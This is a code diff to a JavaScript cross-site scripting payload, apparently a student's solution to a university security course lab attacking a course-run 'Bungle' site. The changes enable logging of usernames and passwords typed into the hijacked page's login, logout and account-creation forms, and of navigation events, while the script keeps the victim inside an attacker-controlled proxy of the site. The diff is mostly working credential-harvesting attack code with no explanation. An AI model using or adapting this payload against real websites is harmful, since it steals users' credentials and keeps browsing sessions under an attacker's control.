@@ -69,7 +69,7 @@ function payload(attacker) {
 
             var target = `http://bungle-cs461.csl.illinois.edu/`;
 
-            function updateCurrentPage(newHtml, newTitle, newPage) {
+            function updatePage(newHtml, newTitle, newPage) {
                 
                 var oldState = {
                     "html": $("html").html()
@@ -130,13 +130,14 @@ function payload(attacker) {
 
                 $(".form-inline").attr("onsubmit", "return false");
 
+                log({event: "nav", user: $("html").contents().find("#logged-in-user").text(), url:'./'});
+
                 // LOG IN BUTTON
                 $("html").contents().find("#log-in-btn").click(function(event){
                     console.log("Log in attempted");
-                    // $("head title", window.parent.document).text("NOT Bungle!");
-                    // history.pushState(null, null, target);
                     var usern=$("html").contents().find("#username").val();
                     var passw=$("html").contents().find("#userpass").val();
+                    log({event: "login", user: usern, pass: passw});
                     
                     $.post(
                         "http://bungle-cs461.csl.illinois.edu/login",
@@ -146,7 +147,7 @@ function payload(attacker) {
                         }
                     )
                     .done(function(data){
-                        updateCurrentPage(data, "NOT Bungle!", "./");
+                        updatePage(data, "NOT Bungle!", "./");
                         console.log("Update curr page");
                         return false;
                     });
@@ -155,19 +156,14 @@ function payload(attacker) {
                 // LOG OUT BUTTON
                 $("html").contents().find("#log-out-btn").click(function(event){
                     console.log("Logout attempted");
-                    // $("head title", window.parent.document).text("Bungle!");
                     
-                    var usern=$("#html").contents().find("#username").val();
-                    var passw=$("#html").contents().find("#userpass").val();
-                    // log({event: "login", user: usern, pass: passw});
+                    var usern=$("html").contents().find("#username").val();
+                    var passw=$("html").contents().find("#userpass").val();
+                    log({event: "logout", user: usern, pass: passw});
+                    
                     $.post("./logout")
                     .done(function(data) {
-                        // log({event: "logout", user: currentUser});
-                        currentUser = ""
-                        // updateHistory();
-                        // $("html").html(data);
-                        // history.pushState({"html" : data}, null, target);
-                        updateCurrentPage(data, "NOT Bungle!", "./");
+                        updatePage(data, "NOT Bungle!", "./");
                         return false;
                     });
                 });
@@ -178,7 +174,8 @@ function payload(attacker) {
 					// history.pushState(null, null, target);
 					var usern=$("html").contents().find("#username").val();
 					var passw=$("html").contents().find("#userpass").val();
-					// log({event: "login", user: usern, pass: passw});
+
+					log({event: "login", user: usern, pass: passw});
 
                     $.post(
                         "http://bungle-cs461.csl.illinois.edu/create",
@@ -188,10 +185,7 @@ function payload(attacker) {
                         }
                     )
                     .done(function(data) {
-                        // currentUser = usernameField.value
-                        // log({event: "login", user: currentUser, pass: userpassField.value});
-                        // updateHistory();
-                        updateCurrentPage(data, "Bungle!", "./");
+                        updatePage(data, "Bungle!", "./");
                         return false;
                     })
 				});
@@ -199,11 +193,11 @@ function payload(attacker) {
                 //BUNGLE BUTTON
                 $("html").contents().find("#bungle-lnk").click(function(event){
                     $("html").contents().find("#bungle-lnk").removeAttr("href");
-                    // history.pushState(null, null, target);
+
                     $.get("./")
                     .done(function(data) {
                         // updateHistory();
-                        updateCurrentPage(data, "NOT Bungle!", "./");
+                        updatePage(data, "NOT Bungle!", "./");
                         return false;
                     });
                 });
@@ -213,12 +207,10 @@ function payload(attacker) {
 					// $("head title", window.parent.document).text("Search Results");
 					var q=$("html").contents().find("#query").val();
 					var new_target="http://bungle-cs461.csl.illinois.edu/search?q="+q
-					// history.pushState(null, null, new_target);
-					// log({event: "nav", user: $("#fake_page").contents().find("#logged-in-user").text(), url:new_target});
                     $.get(new_target)
                     .done(function(data) {
                         // updateHistory();
-                        updateCurrentPage(data, "Search Results", new_target);
+                        updatePage(data, "Search Results", new_target);
                         return false;
                     });
 				});
@@ -226,15 +218,10 @@ function payload(attacker) {
                 // SEARCH AGAIN BUTTON
                 $("html").contents().find("#search-again-btn").click(function(event){
                     $("html").contents().find("#search-again-btn").removeAttr("href");
-					// $("head title", window.parent.document).text("Search Results");
-					// var q=$("html").contents().find("#query").val();
-					// var new_target="http://bungle-cs461.csl.illinois.edu/search?q="+q
-					// history.pushState(null, null, target);
-					// log({event: "nav", user: $("#fake_page").contents().find("#logged-in-user").text(), url:new_target});
                     $.get("./")
                     .done(function(data) {
                         // updateHistory();
-                        updateCurrentPage(data, "Search Results", "./");
+                        updatePage(data, "Search Results", "./");
                         return false;
                     });
 				});
@@ -247,7 +234,7 @@ function payload(attacker) {
                         $.get(urlS)
                         .done(function(data) {
                             // history.pushState({"html" : $.parseHTML(data)}, null, urlS);
-                            updateCurrentPage(data, "Search Results", urlS);
+                            updatePage(data, "Search Results", urlS);
                             return false;
                         });
                     });
@@ -256,51 +243,8 @@ function payload(attacker) {
                         this.remove();
                     }
                 });
-                
-
             }
-
-
-                                    // proxy("./login", attacker);
-            // var loginButton = $("#log-in-btn");
-            // var createAccountButton = $("#new-account-btn");
-
-            // var usernameField = $("#username")[0];
-            // var userpassField = $("#userpass")[0];
-
-            // $(".form-inline").attr("onsubmit", "return false");
-
-            // /* login button */
-            // if (loginButton) {
-            //     loginButton.click(function() {
-            //         if (usernameField.value && userpassField.value) {
-            //             console.log("attempt login");
-
-            //             $.post(
-            //                 "http://bungle-cs461.csl.illinois.edu/login",
-            //                 {
-            //                     username: usernameField.value,
-            //                     password: userpassField.value
-            //                 }
-            //             )
-            //             .done(function(data) {
-            //                 currentUser = usernameField.value
-            //                 log({event: "login", user: currentUser, pass: userpassField.value});
-            //                 // updateHistory();
-            //                 updateCurrentPage(data, "Bungle!", "./");
-            //                 return false;
-            //             })
-            //             .fail(function (jqXHR, textStatus, error) {
-            //                 // updateHistory();
-            //                 textStatus = textStatus.charAt(0).toUpperCase() + textStatus.slice(1)
-            //                 var newTitle = textStatus + ": " + jqXHR.status + " " + error;
-            //                 updateCurrentPage(jqXHR.responseText, newTitle, "./login");
-            //                 return false;
-            //             });
-            //         }
-            //     });
-            // }
-                inject();
+            inject();
             // Show new HTML
             $('html').show();
 
@@ -308,6 +252,7 @@ function payload(attacker) {
             // alert("Notice that although we injected code into the search page, you see here the main page!")
 
         });
+        
     }
     //Call Proxy
 	proxy('./', attacker)
